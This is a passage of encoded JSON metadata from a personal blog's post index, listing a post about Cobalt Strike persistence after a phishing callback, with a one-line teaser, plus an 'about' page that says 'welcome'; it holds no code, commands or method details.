19:53:11&#34;,&#34;dateFormat&#34;:&#34;2021-10-30&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://chroblert.github.io/post/cobaltstrike-shang-xian-zi-dong-wei-quan/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:5000,&#34;words&#34;:28,&#34;minutes&#34;:1},&#34;description&#34;:&#34;\nflash钓鱼后，高兴的是它上线了，可惜的是上线的时候没看到它又掉了....\n\n\n...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;blockquote&gt;\n&lt;p&gt;欢迎&lt;/p&gt;\n&lt;/blockquote&gt;\n&#34;,&#34;fileName&#34;:&#34;about&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;关于&#34;,&#34;tags&#34;:[],&#34;date&#34;:&#34;2021-10-29 22:59:05&#34;,&#34;dateFormat&#34;:&#34;2021-10-29&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://chroblert.github.io/post/about/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:0,&#34;words&#34;:2,&#34;minutes&#34;:1},&#34;description&#34;:&#34;\n欢迎\n\n&#34;,&#34;toc&#34;:&#34;&#34;}]";
